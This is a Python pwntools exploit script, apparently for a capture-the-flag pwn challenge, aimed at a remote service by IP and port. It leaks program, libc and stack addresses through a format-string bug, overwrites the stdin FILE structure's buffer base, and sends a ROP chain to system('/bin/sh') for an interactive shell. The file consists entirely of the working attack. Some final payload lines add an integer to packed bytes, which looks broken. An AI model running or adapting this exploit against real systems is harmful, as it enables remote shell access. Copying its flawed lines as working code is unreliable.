from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')

# io = process('./pwn')
io = remote('111.200.241.244', 62253)
elf = ELF('./pwn')
# libc = ELF('./libc.so.6')

def setname(content):
	io.sendlineafter(b'choice>> ', b'1')
	io.sendlineafter(b'name:', content)

def echo(content):
	io.sendlineafter(b'choice>> ', b'2')
	io.sendlineafter(b'length:', b'7')
	io.send(content)

# return address from echo to main: %13lx
'''
for i in range(1, 20):
	string = b'%' + str(i).encode() + b'$lx\n'
	echo(string)
	io.recvuntil(b'anonymous say:')
	mem_ret_addr = int(io.recvuntil(b'\n')[-13:-1].decode(), 16)
	if(mem_ret_addr & 0xfff == 0xD08):
		break
'''

echo(b'%13$lx\n')
io.recvuntil(b'anonymous say:')
mem_ret_addr = int(io.recvuntil(b'\n')[-13:-1].decode(), 16)

echo(b'%19$lx\n')
io.recvuntil(b'anonymous say:')
libc_start_addr = int(io.recvuntil(b'\n')[-13:-1].decode(), 16)

echo(b'%12$lx\n')
io.recvuntil(b'anonymous say:')
ebp = int(io.recvuntil(b'\n')[-13:-1].decode(), 16)
main_ret = ebp + 8

mem_base = mem_ret_addr - 0xD08
# libc_base = ((libc_start_addr & 0xfffffffffffff000) | 0x740) - libc.symbols['__libc_start_main']
libc = LibcSearcher("__libc_start_main", libc_start_addr)
libc_base = libc_start_addr - libc.dump('__libc_start_main')

print("***" + str(hex(libc_base)) + "***")

# mem_printf_addr = libc_base + libc.symbols['printf']
mem_printf_addr = libc_base + libc.dump('printf')
# print(hex(libc.symbols['system']))
# mem_sys_addr = libc_base + libc.symbols['system']
mem_sys_addr = libc_base + libc.dump('system')
# mem_IO_stdin_addr = libc_base + libc.symbols['_IO_2_1_stdin_']
mem_IO_stdin_addr = libc_base + libc.dump('_IO_2_1_stdin_')
mem_IO_base_addr = mem_IO_stdin_addr + 8 * 7

setname(p64(mem_IO_base_addr))
# echo(b'')
echo(b'%16$hhn\n')

print(hex(mem_base))
print(hex(libc_base))
print(hex(mem_IO_stdin_addr))
# pause()
payload = p64(0x83 + mem_IO_stdin_addr) * 3 + p64(ebp + 0x8) + p64(ebp + 0x20)
io.sendlineafter(b'choice>>', b'2')
io.sendafter(b'length:', payload)
io.sendline(b"")

for i in range(0, len(payload)-1):
	io.sendlineafter(b"choice>>", b'2')
	io.sendlineafter(b'length:', b'')

binsh_addr = mem_base + p64(libc.dump("str_bin_sh"))
sys_addr = mem_base + p64(libc.dump("system"))

io.sendlineafter(b'choice>>', b'2')
payload = p64(0xD93 + mem_base) + p64(binsh_addr) + p64(sys_addr)
io.sendlineafter(b'length:', payload)

io.sendline(b"")
io.sendlineafter(b"choice>>", b"3")

io.interactive()